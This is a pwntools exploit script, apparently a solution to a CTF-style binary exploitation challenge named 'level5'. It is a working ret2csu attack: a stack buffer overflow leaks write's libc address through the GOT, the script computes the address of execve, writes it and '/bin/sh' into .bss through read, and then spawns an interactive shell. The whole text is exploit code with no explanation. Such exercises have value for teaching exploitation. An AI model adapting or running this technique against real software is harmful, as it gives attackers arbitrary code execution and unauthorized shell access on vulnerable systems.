from pwn import *

p = process('./level5')
elf = ELF('level5')
libc = ELF('libc.so.6')

pop_addr = 0x40061a
write_plt = elf.plt['write']
write_got = elf.got['write']
mov_addr = 0x400600
main_addr = elf.symbols['main']
read_got = elf.got['read']
bss_addr = elf.bss()

print hex(bss_addr)
p.recvuntil('Hello, World\n')
playload = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
#gdb.attach(p)
p.sendline(playload)

write_start = u64(p.recv(8))
print hex(write_start)
libc_base = write_start - libc.symbols['write']
execv_addr = libc_base + libc.symbols['execve']

sleep(1)
p.recvuntil('Hello, World\n')
playload1 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_addr) + p64(0) + p64(mov_addr) + 'a'*(0x8+8*6) + p64(main_addr)
#gdb.attach(p)
p.sendline(playload1)
#gdb.attach(p)
sleep(1)
p.send(p64(execv_addr)+'/bin/sh\x00')
#gdb.attach(p)

p.recvuntil('Hello, World\n')
playload2 = 'A'*136 + p64(pop_addr) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr + 8) + p64(mov_addr)
gdb.attach(p)
p.sendline(playload2)
p.interactive()
